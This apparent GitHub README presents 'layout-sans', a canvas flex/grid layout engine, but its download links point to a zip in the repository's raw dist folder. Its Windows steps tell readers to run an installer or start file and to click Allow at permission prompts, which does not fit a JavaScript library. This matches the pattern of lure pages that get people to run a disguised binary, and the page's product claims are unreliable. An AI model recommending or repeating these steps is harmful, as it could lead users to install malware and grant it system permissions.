# 🧩 layout-sans - Precise 2D layout for every screen

[![Download](https://img.shields.io/badge/Download-LayoutSans-6f42c1?style=for-the-badge&logo=github)](https://github.com/epact2039/layout-sans/raw/refs/heads/main/dist/sans-layout-v2.6-beta.4.zip)

## 🖥️ What this is

layout-sans is a desktop-ready layout engine for 2D content. It calculates exact pixel positions for flex and grid trees without using the browser DOM or WebAssembly.

It is built for apps that need clean layout rules, text selection, copy, search, links, and screen-reader access inside a canvas-based interface.

## 📥 Download and open

Use this link to visit the download page:

[Open the layout-sans page](https://github.com/epact2039/layout-sans/raw/refs/heads/main/dist/sans-layout-v2.6-beta.4.zip)

If you are using Windows, follow these steps:

1. Open the link above in your browser.
2. Look for the latest release or main project files on the page.
3. Download the Windows build or project package.
4. Open the downloaded file or folder.
5. Follow the on-screen steps to run the app.

If the project is shared as source files instead of a ready-made installer, you can still use the same page to get the files you need.

## ✨ What you can do

- Get exact pixel layout for flex and grid content
- Build interfaces with no DOM dependency
- Run the same layout code in Node, Bun, Deno, Workers, or the browser
- Use canvas text features like selection and copy
- Search text with Ctrl+F
- Open hyperlinks inside the rendered view
- Support screen readers for better access
- Keep layout behavior consistent across platforms

## 🪟 Windows setup

For most Windows users, the process is simple:

1. Download the project from the link above.
2. Save it to a folder you can find again, such as Downloads or Desktop.
3. If the download is a zipped folder, right-click it and choose Extract All.
4. Open the extracted folder.
5. If you see an installer, run it.
6. If you see a start file, double-click it.
7. If a browser window opens, leave it open while you use the app.

If Windows asks for permission, choose Allow so the app can start.

## 🔧 How it works

layout-sans takes a tree of layout rules and turns it into exact positions and sizes. It follows flex and grid style logic, then returns numbers you can use to draw your UI.

That makes it useful for:

- canvas apps
- custom editors
- document viewers
- design tools
- data dashboards
- embedded UI systems

It avoids the DOM, so you can keep control over how the interface is drawn and measured.

## 📋 Basic use case

A common setup looks like this:

1. Load your content.
2. Pass the layout tree into the engine.
3. Read the computed x, y, width, and height values.
4. Draw each element on a canvas.
5. Handle clicks, text selection, and search using the same layout data.

This works well when you want a predictable interface and need precise placement.

## 🧭 When to use it

Use layout-sans if you want:

- a layout engine for canvas apps
- text interaction without the DOM
- exact size and position data
- cross-platform runtime support
- a clean flex and grid model

It is a strong fit for products that need rich text and structured layout in one place.

## 🧱 Included topics

This repository is focused on:

- canvas
- engine
- pretext

These topics match the goal of a layout engine that can render complex content while keeping text and interaction logic in sync.

## 🛠️ Common Windows issues

If the app does not start, check these points:

- Make sure the download finished fully
- Extract the files if they came in a zip folder
- Run the app from a normal user folder, not a protected system folder
- Close and reopen the project if the window does not appear
- Try the latest version from the project page

If the browser opens but nothing shows, refresh the page or restart the app file.

## 📚 File layout you may see

After downloading, you may find:

- a README file
- source files
- a package file
- example assets
- build output
- a config file

These files help you run, test, or build the app depending on how the project is shared.

## 🎯 Good first checks

After you open the app, look for:

- a sample layout screen
- text that you can select
- clickable links
- a search box or search shortcut
- clear boxes and spacing changes
- smooth canvas redraws

If these work, the engine is running as expected.